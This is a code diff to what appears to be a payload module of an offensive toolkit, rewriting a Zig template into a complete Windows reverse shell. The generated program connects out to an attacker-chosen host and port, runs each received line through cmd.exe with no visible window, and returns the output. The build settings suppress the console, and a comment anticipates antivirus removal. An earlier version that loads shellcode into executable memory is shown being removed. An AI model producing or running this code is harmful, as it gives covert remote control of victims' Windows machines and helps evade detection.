@@ -227,7 +227,8 @@ class Module(Payload):
                 target_arch='x86_64',
                 optimization='ReleaseSmall',
                 strip=True,
-                static=True
+                static=True,
+                windows_subsystem='windows'
             ):
                 # Wait a moment and verify file exists (antivirus might delete it immediately)
                 import time
@@ -256,15 +257,15 @@ class Module(Payload):
             return stage_shellcode
     
     def _generate_zig_wrapper(self, stage_shellcode: bytes) -> str:
-        """Generate Zig wrapper code that connects and executes stage shellcode"""
-        
-        # Convert shellcode to Zig array
-        shellcode_hex = ', '.join(f'0x{b:02x}' for b in stage_shellcode)
-        
+        """Generate Zig code for a full Windows reverse shell (connect + command loop with cmd.exe).
+        Does not use the stage shellcode for the EXE; the shellcode is only for raw/staged use.
+        Protocol: receive line (until \\r\\n), execute via cmd.exe /c, send output. Compatible with classic_shell.
+        """
         zig_code = f"""const std = @import("std");
 const os = std.os;
-const ws2_32 = os.windows.ws2_32;
+const process = std.process;
 const mem = std.mem;
+const ws2_32 = os.windows.ws2_32;
 
 const SOCKADDR_IN = extern struct {{
     family: u16,
@@ -273,63 +274,110 @@ const SOCKADDR_IN = extern struct {{
     zero: [8]u8,
 }};
 
-const stage_shellcode = [_]u8{{{shellcode_hex}}};
-
 fn connectToHost(host: []const u8, port: u16) !ws2_32.SOCKET {{
     var wsa_data: ws2_32.WSADATA = undefined;
     if (ws2_32.WSAStartup(0x0202, &wsa_data) != 0) {{
         return error.ConnectionFailed;
     }}
-    
     const sock = ws2_32.socket(2, 1, 0);
     if (sock == ws2_32.INVALID_SOCKET) return error.ConnectionFailed;
-    
     var host_buf: [256]u8 = undefined;
     if (host.len >= host_buf.len) return error.InvalidAddress;
     @memcpy(host_buf[0..host.len], host);
     host_buf[host.len] = 0;
-    
     var addr: SOCKADDR_IN = .{{
         .family = 2,
         .port = ws2_32.htons(port),
         .addr = ws2_32.inet_addr(&host_buf),
         .zero = [_]u8{{0}} ** 8,
     }};
-    
-    if (ws2_32.connect(
-        sock,
-        @ptrCast(&addr),
-        @sizeOf(SOCKADDR_IN),
-    ) != 0) {{
+    if (ws2_32.connect(sock, @ptrCast(&addr), @sizeOf(SOCKADDR_IN)) != 0) {{
         return error.ConnectionFailed;
     }}
-    
     return sock;
 }}
 
+fn sendAll(sock: ws2_32.SOCKET, data: []const u8) !void {{
+    var sent: usize = 0;
+    while (sent < data.len) {{
+        const n = ws2_32.send(sock, data.ptr + sent, @intCast(data.len - sent), 0);
+        if (n == ws2_32.SOCKET_ERROR) return error.SendFailed;
+        sent += @intCast(n);
+    }}
+}}
+
+fn recvLine(allocator: std.mem.Allocator, sock: ws2_32.SOCKET, max: usize) ![]u8 {{
+    var list = std.ArrayList(u8).empty;
+    var buf: [1]u8 = undefined;
+    while (list.items.len < max) {{
+        const n = ws2_32.recv(sock, &buf, 1, 0);
+        if (n == ws2_32.SOCKET_ERROR or n == 0) return error.Closed;
+        if (buf[0] == '\\n') break;
+        if (buf[0] != '\\r') try list.append(allocator, buf[0]);
+    }}
+    return try list.toOwnedSlice(allocator);
+}}
+
+fn execCmd(allocator: std.mem.Allocator, cmd: []const u8, cwd: ?[]const u8) ![]u8 {{
+    const trimmed = mem.trim(u8, cmd, " \\r\\n");
+    if (trimmed.len == 0) return allocator.dupe(u8, "");
+    var args = std.ArrayList([]const u8).empty;
+    defer args.deinit(allocator);
+    try args.append(allocator, "cmd.exe");
+    try args.append(allocator, "/c");
+    try args.append(allocator, trimmed);
+    var child = process.Child.init(args.items, allocator);
+    child.cwd = cwd;
+    child.stdin_behavior = .Ignore;
+    child.stdout_behavior = .Pipe;
+    child.stderr_behavior = .Pipe;
+    child.create_no_window = true;
+    child.spawn() catch |e| {{
+        return std.fmt.allocPrint(allocator, "Error: {{s}}\\n", .{{@errorName(e)}});
+    }};
+    var out = std.ArrayList(u8).empty;
+    defer out.deinit(allocator);
+    var err = std.ArrayList(u8).empty;
+    defer err.deinit(allocator);
+    child.collectOutput(allocator, &out, &err, 1024 * 1024) catch |e| {{
+        return std.fmt.allocPrint(allocator, "Error: {{s}}\\n", .{{@errorName(e)}});
+    }};
+    _ = child.wait() catch |e| {{
+        return std.fmt.allocPrint(allocator, "Error: {{s}}\\n", .{{@errorName(e)}});
+    }};
+    if (err.items.len == 0) return allocator.dupe(u8, out.items);
+    var combined = std.ArrayList(u8).empty;
+    try combined.appendSlice(allocator, out.items);
+    try combined.appendSlice(allocator, err.items);
+    return try combined.toOwnedSlice(allocator);
+}}
+
 pub fn main() !void {{
+    var gpa = std.heap.GeneralPurposeAllocator(.{{.safety = false}}){{}};
+    defer _ = gpa.deinit();
+    const allocator = gpa.allocator();
+
     const host = "{self.lhost}";
     const port: u16 = {self.lport};
-    
+
     const sock = try connectToHost(host, port);
     defer _ = ws2_32.closesocket(sock);
-    
-    const page_size = 4096;
-    const aligned_size = ((stage_shellcode.len + page_size - 1) / page_size) * page_size;
-    
-    const shellcode_mem_ptr = try os.windows.VirtualAlloc(
-        null,
-        aligned_size,
-        os.windows.MEM_COMMIT | os.windows.MEM_RESERVE,
-        os.windows.PAGE_EXECUTE_READWRITE
-    );
-    defer _ = os.windows.VirtualFree(shellcode_mem_ptr, 0, os.windows.MEM_RELEASE);
-    
-    const shellcode_mem = @as([*]u8, @ptrCast(shellcode_mem_ptr))[0..aligned_size];
-    @memcpy(shellcode_mem[0..stage_shellcode.len], &stage_shellcode);
-    
-    const func = @as(*const fn () void, @ptrCast(shellcode_mem_ptr));
-    func();
+
+    const cwd = process.getCwdAlloc(allocator) catch null;
+    defer if (cwd) |c| allocator.free(c);
+
+    while (true) {{
+        const cmd = recvLine(allocator, sock, 8192) catch break;
+        defer allocator.free(cmd);
+        const output = execCmd(allocator, cmd, cwd) catch |e| {{
+            const msg = std.fmt.allocPrint(allocator, "Error: {{s}}\\n", .{{@errorName(e)}}) catch break;
+            defer allocator.free(msg);
+            sendAll(sock, msg) catch break;
+            continue;
+        }};
+        defer allocator.free(output);
+        sendAll(sock, output) catch break;
+    }}
 }}
 """
         return zig_code
